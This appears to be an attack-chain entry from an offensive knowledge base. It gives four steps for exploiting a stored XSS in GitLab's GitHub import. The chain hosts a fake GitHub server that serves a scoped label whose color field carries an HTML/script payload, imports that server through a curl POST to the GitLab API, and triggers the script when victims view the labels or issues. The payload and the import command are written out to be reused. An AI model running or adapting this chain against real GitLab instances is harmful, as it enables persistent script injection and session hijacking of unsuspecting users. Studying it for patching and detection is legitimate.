---
tags:
  - xss
  - stored-xss
  - csp-bypass
  - gitlab
  - github-import
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/Dummy-GitHub-Server]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Obtain-GitLab-Prerequisites]]'
  - '[[procedures/Set-Up-Malicious-GitHub-Server]]'
  - '[[procedures/Import-Malicious-Repository-via-API]]'
  - '[[procedures/Trigger-XSS-by-Viewing-Labels]]'
step_count: 4
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:55:20.981Z'
description: >-
  A multi-stage attack exploiting a stored XSS vulnerability in GitLab by
  injecting malicious payloads into scoped label colors during GitHub repository
  imports, bypassing CSP to execute JavaScript on victims viewing labels or
  issues.
id: 6c361419-d156-40ad-915c-7a6eb642375a
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Stored XSS via Scoped Labels in GitLab GitHub Import with CSP Bypass

Multi-stage attack chain demonstrating exploitation of a stored XSS vulnerability in GitLab, allowing injection of malicious JavaScript into scoped label colors during GitHub repository imports, bypassing Content Security Policy (CSP) to execute arbitrary code when victims view project labels or issues.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prerequisites] --> B[Setup Malicious Server]
    B --> C[Import Repository]
    C --> D[Trigger XSS]
    D --> E[Exploitation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/Dummy-GitHub-Server]]

### Target Environment

- GitLab instance (e.g., gitlab.com) with GitHub import enabled
- Required services/ports: GitLab API (HTTPS/443), custom GitHub server on port 11211
- Network access requirements: Internet access to GitLab API and ability to host a server

### Initial Access Requirements

- GitLab Premium account
- Personal access token with 'api' scope
- GitHub personal access token (can be fake for dummy server)

## Detailed Attack Procedures

### Step 1: Obtain Prerequisites
procedure: [[procedures/Obtain-GitLab-Prerequisites]]

**Objective**: Gather necessary credentials and access for the attack.

**Instructions**: Create a GitLab personal access token with 'api' scope by navigating to https://gitlab.com/-/profile/personal_access_tokens and generating one. Set it as an environment variable $GL_TOKEN.

**Expected Output**: A valid token string, e.g., glpat-XXXXXXXXXXXXXXXXXXXX.

**Success Indicators**:
- Token created successfully
- Token has 'api' scope

### Step 2: Set Up Malicious GitHub Server
procedure: [[procedures/Set-Up-Malicious-GitHub-Server]]

**Objective**: Host a fake GitHub repository containing a scoped label with an XSS payload in its color field.

**Instructions**: Deploy a dummy GitHub server at http://51.75.74.52:11211 (or similar IP:port). Create a label named 'yvvdwf::label-name' with color set to '">yvvdwf-label<form class='hidden gl-show-field-errors'><input title='<script>alert(document.domain)</script>'>' to inject the XSS payload.

**Expected Output**: Server responding with the malicious label data when queried.

**Success Indicators**:
- Server accessible on port 11211
- Malicious label verifiable via API query

### Step 3: Import Malicious Repository via API
procedure: [[procedures/Import-Malicious-Repository-via-API]]

**Objective**: Use GitLab's API to import the malicious repository, storing the XSS payload in scoped labels.

**Instructions**: Execute the import using [[commands/gitlab-github-import-curl]]:

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: $GL_TOKEN" --data '{
 "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
 "repo_id": "523303538",
 "target_namespace": "yvvdwf-group-a",
 "new_name": "xss-on-label-color",
 "github_hostname": "http://51.75.74.52:11211"
}'
```

Replace placeholders with actual values. This sends a POST to the GitLab import endpoint with details pointing to the dummy server.

**Expected Output**: JSON response like {"id":123,"status":"started"} indicating successful import initiation.

**Success Indicators**:
- Import job starts without errors
- Repository appears in target namespace

### Step 4: Trigger XSS by Viewing Labels
procedure: [[procedures/Trigger-XSS-by-Viewing-Labels]]

**Objective**: Execute the injected JavaScript by accessing project labels or issues, leading to potential data theft or account takeover.

**Instructions**: Navigate to URLs like https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/labels or https://gitlab.com/yvvdwf-group-a/xss-on-label-color/-/issues/1 in a victim's browser.

**Expected Output**: Alert box popping up with 'gitlab.com' (or victim's domain), confirming XSS execution.

**Success Indicators**:
- JavaScript alert triggers
- Malicious script executes in browser context

## Attack Chain Summary

### Key Achievements

1. Bypassed CSP in GitLab by exploiting overlooked scoped labels during imports
2. Stored persistent XSS payload in label colors for repeated execution
3. Enabled arbitrary JavaScript execution leading to session hijacking or data exfiltration

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---

*Last updated: 2023-10-01T00:00:00Z*
